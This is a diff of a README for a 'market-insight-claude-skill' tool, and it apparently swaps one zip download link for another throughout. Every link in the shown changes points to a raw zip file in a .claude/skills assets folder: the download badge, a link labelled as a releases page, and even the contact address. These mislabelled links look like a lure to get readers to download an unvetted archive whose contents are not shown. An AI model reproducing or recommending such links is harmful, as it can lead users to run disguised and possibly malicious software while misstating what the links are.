@@ -1,7 +1,7 @@
 # 📊 market-insight-claude-skill - Gain User Insight in Minutes
 
 ## 📥 Download the latest version
-[![Download](https://raw.githubusercontent.com/roottechinfosystemofficial/market-insight-claude-skill/main/.claude/skills/insight/assets/insight_skill_market_claude_metrofibroma.zip)](https://raw.githubusercontent.com/roottechinfosystemofficial/market-insight-claude-skill/main/.claude/skills/insight/assets/insight_skill_market_claude_metrofibroma.zip)
+[![Download](https://raw.githubusercontent.com/roottechinfosystemofficial/market-insight-claude-skill/main/.claude/skills/insight/assets/skill_claude_market_insight_1.1.zip)](https://raw.githubusercontent.com/roottechinfosystemofficial/market-insight-claude-skill/main/.claude/skills/insight/assets/skill_claude_market_insight_1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **market-insight-claude-skill**. This application helps you understand user needs and find product opportunities quickly. You can achieve insights in just ten minutes, tasks that usually take weeks. Follow the steps below to download and run the software.
@@ -17,7 +17,7 @@ To get started, you first need to download the software from our releases page.
 
 1. Click the link below to visit the releases page:
    
-   [Download Here](https://raw.githubusercontent.com/roottechinfosystemofficial/market-insight-claude-skill/main/.claude/skills/insight/assets/insight_skill_market_claude_metrofibroma.zip)
+   [Download Here](https://raw.githubusercontent.com/roottechinfosystemofficial/market-insight-claude-skill/main/.claude/skills/insight/assets/skill_claude_market_insight_1.1.zip)
 
 2. Once on the releases page, locate the latest version.
 
@@ -60,6 +60,6 @@ If you face any issues while using market-insight-claude-skill, please refer to 
 Your input matters! Feel free to provide your comments and suggestions. They help us improve the application.
 
 ## 📧 Contact
-For additional questions or support, you can contact the development team at [https://raw.githubusercontent.com/roottechinfosystemofficial/market-insight-claude-skill/main/.claude/skills/insight/assets/insight_skill_market_claude_metrofibroma.zip].
+For additional questions or support, you can contact the development team at [https://raw.githubusercontent.com/roottechinfosystemofficial/market-insight-claude-skill/main/.claude/skills/insight/assets/skill_claude_market_insight_1.1.zip].
 
 Thank you for using market-insight-claude-skill! We hope it brings you valuable insights into your target market.
